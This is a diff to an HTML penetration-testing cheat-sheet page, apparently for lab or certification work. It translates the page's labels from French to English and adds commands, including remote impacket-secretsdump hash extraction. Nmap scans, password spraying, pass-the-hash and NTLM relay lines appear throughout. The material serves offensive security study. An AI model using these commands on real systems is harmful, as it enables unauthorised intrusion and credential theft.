@@ -45,8 +45,8 @@
     <textarea id="notes-area" placeholder="Paste one-liners, IPs, hashes..."></textarea>
   </div>
   <div class="action-row">
-    <button type="button" class="clear-all-btn" id="clear-all-btn">✕ EFFACER TOUT</button>
-    <button type="button" class="collapse-all-btn" id="collapse-all-btn">↑ RÉDUIRE TOUT</button>
+    <button type="button" class="clear-all-btn" id="clear-all-btn">✕ CLEAN ALL</button>
+    <button type="button" class="collapse-all-btn" id="collapse-all-btn">↑ COLLAPSE ALL</button>
   </div>
   <div class="target-fields">
     <div class="tfield"><label>IP</label><input type="text" id="var-ip" placeholder="192.168.10.x" data-vars="IP,TARGET,TARGET_IP,target_ip,ip"><button type="button" class="input-clear" data-for="var-ip" tabindex="-1">×</button></div>
@@ -90,7 +90,7 @@
 </div>
 
 <!-- ===================== ENUMERATION ===================== -->
-<div class="panel active" id="panel-enum">
+<!-- <div class="panel active" id="panel-enum">
 
 <div class="section" id="s-nmap">
   <div class="section-header" onclick="toggleSection(this)">
@@ -121,7 +121,49 @@ nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt  # Export greppable</pre></div>
 nmap --script-help http-headers
 nmap --script http-headers &lt;IP&gt;</pre></div>
   </div>  
+</div> -->
+
+<div class="panel active" id="panel-enum">
+
+<div class="section" id="s-nmap">
+  <div class="section-header" onclick="toggleSection(this)">
+    <div class="section-header-left"><span class="section-icon">&#9660;</span><span class="section-title">NMAP</span><span class="section-tag">SCANNING</span></div>
+  </div>
+  <div class="section-body">
+    <h3 class="sub-title">Initial scan (TCP all ports + UDP, output to file)</h3>
+    <div class="code-wrap"><pre data-template>nmap -sT -p- -T4 &lt;IP&gt; -oN WSXX.nmap
+sudo nmap -sU -T4 &lt;IP&gt; -oN WSXX.udp.nmap</pre></div>
+    <div class="note">Replace <code>WSXX</code> with machine/host name (e.g. WS01). TCP: connect scan all ports; UDP: requires sudo.</div>
+    <h3 class="sub-title">Scan Types</h3>
+    <div class="code-wrap"><pre data-template>nmap &lt;IP&gt; port/port-range
+sudo nmap -sS &lt;IP&gt;              # Stealth SYN scan
+nmap -sT &lt;IP&gt;                   # Full TCP connect scan
+sudo nmap -sU -T4 &lt;IP&gt;              # UDP scan
+sudo nmap -sU -Pn -p- --min-rate 1000 --max-retries 1 &lt;IP&gt;     # Top 1000 ports UDP
+sudo nmap -sU -sS &lt;IP&gt;          # Combo TCP/UDP</pre></div>
+    <h3 class="sub-title">Quick scan (top 100 ports, no ping)</h3>
+    <div class="code-wrap"><pre data-template>nmap -Pn -F &lt;IP&gt;
+sudo nmap -Pn -F --min-rate 5000 &lt;IP&gt;</pre></div>
+    <h3 class="sub-title">Full scan (all ports + version + default scripts)</h3>
+    <div class="code-wrap"><pre data-template>sudo nmap -sV -sC -p- -Pn --min-rate 5000 &lt;IP&gt;</pre></div>
+    <h3 class="sub-title">Network Discovery</h3>
+    <div class="code-wrap"><pre data-template>nmap -sn 192.168.50.1-253        # Network Sweep
+nmap -sT -A &lt;IP&gt;                # Service &amp; Script Scan
+nmap -sV -A &lt;IP&gt;                # Service Scan</pre></div>
+    <h3 class="sub-title">Detection &amp; Scripts</h3>
+    <div class="code-wrap"><pre data-template>sudo nmap -O &lt;IP&gt; --osscan-guess                # OS detection
+nmap -sV &lt;IP&gt;                                   # Service detection
+sudo nmap -sV -p 443 --script "vuln" &lt;IP&gt;       # Vuln script scan
+nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt  # Export greppable</pre></div>
+    <h3 class="sub-title">NSE Scripts</h3>
+    <div class="code-wrap"><pre data-template>ls /usr/share/nmap/scripts/
+nmap --script-help http-headers
+nmap --script http-headers &lt;IP&gt;</pre></div>
+  </div>
 </div>
+
+
+
 
 <div class="section" id="rustscan">
   <div class="section-header" onclick="toggleSection(this)">
@@ -138,7 +180,7 @@ rustscan -a &lt;IP&gt; --ulimit 5000 --range 1-65535 -- -sV -Pn -sC -A > &lt;IP&
     <div class="section-header-left"><span class="section-icon">&#9660;</span><span class="section-title">PASSWORD SPRAYING</span><span class="section-tag">PASS SPRAY</span></div>
   </div>
   <div class="section-body">
-    <h3 class="sub-title">Spraying par services</h3>
+    <h3 class="sub-title">Spraying per services</h3>
     <div class="code-wrap"><pre data-template>netexec smb &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASS&gt;
 netexec winrm &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASS&gt;
 nxc winrm &lt;IP&gt; -u users.txt -H hash.hash
@@ -151,7 +193,7 @@ netexec ssh ip.txt -u &lt;USER&gt; -p '&lt;PASS&gt;' --key-dile id_rsa --port &l
 nxc winrm &lt;IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --local-auth</pre></div>
 
 
-    <h3 class="sub-title">Spraying tous les services</h3>
+    <h3 class="sub-title">Spraying all services</h3>
     <div class="code-wrap"><pre data-template>for proto in smb winrm rdp wmi ldap mssql ssh vnc nfs ftp; do nxc $proto &lt;IP&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;'; done</pre></div>
 
 </div></div>
@@ -720,8 +762,11 @@ impacket-secretsdump -sam SAM -system SYSTEM LOCAL</pre></div>
     <div class="code-wrap"><pre data-template>nxc smb &lt;IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M backup_operator
 # Downloads SAM, SYSTEM, NTDS.dit to /tmp/
 secretsdump.py -ntds ntds.dit -system system.hive LOCAL</pre></div>
+    <h4 class="sub-subtitle">SecretsDump Remotely</h4>
+    <div class="note">Extracts local and domain hashes remotely</div>
+    <div class="code-wrap"><pre data-template>impacket-secretsdump &lt;DOMAIN&gt;/&lt;USER&gt;:'&lt;PASS&gt;'@&lt;IP&gt;</pre></div>
     <h4 class="sub-subtitle">Robocopy (Read Files Bypassing ACLs)</h4>
-    <div class="code-wrap"><pre class="lang-powershell" data-template>robocopy /b "C:\Users\Administrator\Desktop" "C:\Users\user\Desktop"</pre></div>
+    <div class="code-wrap"><pre class="lang-powershell" data-template>robocopy /b "C:\Users\Administrator\Desktop" "C:\temp" file.txt</pre></div>
   </div>
     <h3 class="sub-title">SeRestorePrivilege</h3>
     <div>
@@ -1988,7 +2033,8 @@ wmiexec.py -hashes :&lt;NTHASH&gt; Administrator@&lt;IP&gt;
 smbclient -hashes :&lt;NTHASH&gt; Administrator@&lt;IP&gt;</pre></div>
     <h3 class="sub-title">Secretsdump</h3>
     <div class="code-wrap"><pre data-template>secretsdump.py -sam sam.hive -system system.hive LOCAL
-secretsdump.py -ntds ntds.dit -system system.hive LOCAL</pre></div>
+secretsdump.py -ntds ntds.dit -system system.hive LOCAL
+impacket-secretsdump &lt;DOMAIN&gt;/&lt;USER&gt;:'&lt;PASS&gt;'@&lt;IP&gt;</pre></div>
     <h3 class="sub-title">NTLM Relay</h3>
     <div class="code-wrap"><pre data-template>ntlmrelayx.py --no-http-server -smb2support -t &lt;IP&gt; -c "powershell -e BASE64"</pre></div>
   </div>
@@ -2123,6 +2169,17 @@ Get-ChildItem -Path C:\ -Recurse -Include "*.config","*.env" -File
 Get-ChildItem -Path C:\ -Recurse -Include "*.txt" | Where-Object { $_.LastWriteTime -gt (Get-Date).AddHours(-1) }</pre></div>
     <h3 class="sub-title">CMD (dir)</h3>
     <div class="code-wrap"><pre data-template>dir /s /b C:\path\*.txt</pre></div>
+  </div>
+</div>
+
+<div class="section" id="s-winpeas-read">
+  <div class="section-header" onclick="toggleSection(this)">
+    <div class="section-header-left"><span class="section-icon">&#9660;</span><span class="section-title">WinPEAS exported output (read with colors)</span><span class="section-tag">WINPEAS</span></div>
+  </div>
+  <div class="section-body">
+    <div class="note">WinPEAS saves to UTF-16LE; convert to UTF-8 and pipe to <code>less -R</code> so ANSI colors render.</div>
+    <div class="code-wrap"><pre data-template>iconv -f UTF-16LE -t UTF-8 winpeas_andrea.txt | less -R</pre></div>
+    <div class="note">No colors when running WinPEAS on Windows? Enable virtual terminal then reopen shell: <code>reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1</code></div>
   </div>
 </div>
 
@@ -2264,11 +2321,11 @@ hostname && whoami && ipconfig && type C:\Users\Administrator\Desktop\proof.txt<
 <!-- CONFIRM CLEAR ALL MODAL -->
 <div class="confirm-overlay" id="confirm-overlay">
   <div class="confirm-modal" onclick="event.stopPropagation()">
-    <div class="confirm-modal-title">⚠ EFFACER TOUT</div>
-    <div class="confirm-modal-msg">Toutes les valeurs saisies (IP, URL, USER, PASS, NTLM, LHOST, LPORT, WORDLIST, DIRLIST) seront effacées.<br><br>Confirmer ?</div>
+    <div class="confirm-modal-title">⚠ CLEAN ALL</div>
+    <div class="confirm-modal-msg">All entered values ​​(IP, URL, USER, PASS, NTLM, LHOST, LPORT, WORDLIST, DIRLIST) will be erased.<br><br>Confirm ?</div>
     <div class="confirm-modal-actions">
-      <button type="button" class="confirm-cancel-btn" onclick="closeConfirmModal()">ANNULER</button>
-      <button type="button" class="confirm-ok-btn" onclick="clearAllInputs()">EFFACER</button>
+      <button type="button" class="confirm-cancel-btn" onclick="closeConfirmModal()">CANCEL</button>
+      <button type="button" class="confirm-ok-btn" onclick="clearAllInputs()">CLEAN</button>
     </div>
   </div>
 </div>
